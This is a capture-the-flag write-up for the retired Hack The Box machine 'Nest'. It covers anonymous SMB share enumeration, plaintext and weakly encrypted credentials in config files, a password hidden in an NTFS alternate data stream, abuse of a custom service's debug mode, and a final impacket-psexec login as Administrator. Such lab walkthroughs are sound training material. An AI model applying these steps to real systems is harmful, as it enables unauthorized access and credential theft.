# Nest

This is the write-up for the box Nest that got retired at the 6th June 2020.
My IP address was 10.10.14.4 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.178    nest.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/nest.nmap 10.10.10.178
```

```
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
```

## Checking SMB (Port 445)

The shares on the SMB service can be displayed without specifying a username:
```
smbclient -L //10.10.10.178
```
```
Sharename     Type     Comment
---------     ----     -------
ADMIN$        Disk     Remote Admin
C$            Disk     Default share
Data          Disk
IPC$          IPC      Remote IPC
Secure$       Disk
Users         Disk
```

The shares _Data_, _Users_ and _Secure_ are non-default shares and should be enumerated for more information.
The tool **SMBmap** can show the permissions that users have on those, even when using a username that does not exist:
```
smbmap -H 10.10.10.178 -u testuser
```
```
Disk        Permissions     Comment
----        -----------     -------
ADMIN$      NO ACCESS       Remote Admin
C$          NO ACCESS       Default share
Data        READ ONLY
IPC$        NO ACCESS       Remote IPC
Secure$     NO ACCESS
Users       READ ONLY
```

Enumerating the shares with **SMBclient**:
```
smbclient //10.10.10.178/Users

smbclient //10.10.10.178/Data
```

It looks like that these have big file structures, so it is more practical to enumerate the shares by mounting them directly to our client:
```
mkdir /mnt/user
mount -t cifs //10.10.10.178/Users /mnt/user/

mkdir /mnt/data
mount -t cifs //10.10.10.178/Data /mnt/data/
```

In the _Users_ share are the home directories of five users, but we have no permission on any of them.
- Administrator
- C.Smith
- L.Frost
- R.Thompson
- TempUser

Display all files in the _Data_ share:
```
find /mnt/data -ls -type f
```

The file _"/data/Shared/Templates/HR/Welcome Email.txt"_ contains credentials for _TempUser_:
```
You will find your home folder in the following location:
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019
```

Lets use the credentials of _TempUser_ and mount the home directory to enumerate it:
```
mkdir /mnt/tempuser
mount -t cifs -o 'username=TempUser,password=welcome2019' //10.10.10.178/Users/TempUser /mnt/tempuser/
```

There is only one empty file, that is useless, but maybe this user has access to more shares:
```
smbmap -u TempUser -p welcome2019 -H 10.10.10.178
```
```
Disk        Permissions     Comment
----        -----------     -------
ADMIN$      NO ACCESS       Remote Admin
C$          NO ACCESS       Default share
Data        READ ONLY
IPC$        NO ACCESS       Remote IPC
Secure$     READ ONLY
Users       READ ONLY
```

This user has access to the _Secure_ share, so mounting it:
```
mkdir /mnt/secure
mount -t cifs -o 'username=TempUser,password=welcome2019' //10.10.10.178/Secure$ /mnt/secure/
```

There are three directories in there, but permissions are denied on all of them:
- _/Secure/Finance_
- _/Secure/HR_
- _/Secure/IT_

By mounting the _Data_ share with the credentials, we can see if the user _TempUser_ has access to more directories:
```
mount -t cifs -o 'username=TempUser,password=welcome2019' //10.10.10.178/Data /mnt/data
```

Display all files in the _Data_ share:
```
find /mnt/data/ -ls -type f
```

This user has access to more files in _/Data/IT_, which has several XML configuration files in _/Data/IT/Configs_.
After looking through the files, the following files have valuable information in them:
- _/Data/IT/Configs/RU Scanner/RU_config.xml_
  ```
  (...)
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
  (...)
  ```

Decoding the Base64 string results in a strange set of characters, which could indicate that it is encrypted content:
```
echo fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= | base64 -d
```
```
}13=XJBAX*Wcf?βc
```

- _/Data/IT/Configs/NotepadPlusPlus/config.xml_
  ```
  (...)
  <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
  </History>
  ```

As tested before, the current user _TempUser_ has no permission to display the directories of _/Secure/IT_, but it is possible to see the file structure in _/Secure/IT/Carl_.
The file _Temp.txt_ does not exist, but in _/Secure/IT/Carl/VB Projects/WIP/RU/RUScanner_ is the **Visual Basic source code** of the _RU Scanner_ from which a configuration file was seen before.

So the goal is to decrypt the password of _c.smith_ by building and analyzing the **Visual Basic source code** of _RU Scanner_.

### Analyzing Visual Basic Code

The source code in _Module1.vb_ loads _RU_config.xml_ and uses the function _DecryptString_ in _Utils.vb_ to decrypt it:
```
Module Module1

    Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
(...)
```

I will open the VB project with **Visual Studio** and step through the code until it hits the breakpoint at decrypting it.
It wants to have the _RU_config.xml_ in the directory _/bin/Debug/_, so the file has to be put there.

After stepping through the code, the function _DecryptString_ decrypts the password and returns the value in the _DbPof.Utils.Decrypted_ variable:
> xRxRxPANCAK3SxRxRx

Lets use the credentials of _c.smith_ and mount the home directories:
```
mount -t cifs -o 'username=c.smith,password=xRxRxPANCAK3SxRxRx' //10.10.10.178/Users/ /mnt/user/
```

The user has access to the own home directory that can now be enumerated.

### Enumerating Home Directory of C.Smith

The user _c.smith_ has one folder in the home directory called _/Users/C.Smith/HQK Reporting_ with several files:
- _Debug Mode Password.txt_
  - Empty file

- _HQK_Config_Backup.xml_
  - XML file with the following content:
  ```  
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
  ```

- _/AD Integration Module/HqkLdap.exe_
  - PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows

Even though the file _Debug Mode Password.txt_ is empty, it is strange that it exists, so the NTFS attributes and permissions should be examined.
This can be either done by mounting the file system on a Windows machine or using **SMBclient** on Linux:
```
smbclient -U c.smith //10.10.10.178/Users
```

Display extended attributes:
```
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
```
```
(...)
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
```

It shows an **Alternate Data Stream** and thus has a hidden file in it called _Password_, that can be downloaded:
```
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt":Password
```

Debug Mode Password:
> WBQ201953D8w

Checking if port 4386 listens:
```
nmap -p 4386 10.10.10.178
```
```
PORT     STATE SERVICE
4386/tcp open  unknown
```

The password could be eventually used on this service.

## Checking Port 4386

It is possible to connect to the service with `nc`, but it does not listen to commands while `telnet` does:
```
nc 10.10.10.178 4386

HQK Reporting Service V1.2

>help
```

Connecting with `telnet`:
```
telnet 10.10.10.178 4386

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
```

The command _SETDIR_ is used to switch the directory and in the directory above are executable files and some more directories:
```
>setdir ..

Current directory set to HQK
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml
```

This command does not have any constraints and can be used to enumerate the whole file system:
```
>setdir C:\
```

Unfortunately there is no command to read any files.
The command _DEBUG_ asks for a password and we found one earlier hidden in _Debug Mode Password.txt_ that works:
```
>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
```
```
>help

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
```

With the new command _SHOWQUERY_ it is possible to read files.
In the _LDAP_ directory is a file called _Ldap.conf_ with credentials:
```
Current directory set to HQK
>setdir ldap

Current directory set to ldap
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: ldap
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

The password looks like Base64-encoded, but is again an encrypted string and it probably gets encrypted by _HqkLdap.exe_.

### Analyzing .NET Binary

I will analyze the binary with the .NET debugger and assembly editor [dnSpy](https://github.com/dnSpy/dnSpy).
In the _MainModule.cs_ on line 55, the decrypted password is put into a variable:
```
(...)
ldap.Password = ldapSearchSettings.Password;
(...)
```

By modifying the code after this point to print the contents of the variable, it will be printed before it gets encrypted:
```
(...)
ldap.Password = ldapSearchSettings.Password;
Console.WriteLine(ldap.Password);
(...)
```

After removing the errors and building the binary, the new modified version can be executed with the _ldap.conf_ configuration file as a parameter:
```
HqkLdap.exe ldap.conf
```

It successfully prints a password:
> XtH4nkS4Pl4y1nGX

According to the configuration file, the username that belongs to this password is _Administrator_ so **PsExec** can be used to login to the box:
```
impacket-psexec Administrator@10.10.10.178
```

This starts a shell session on the box as the _SYSTEM_ user!
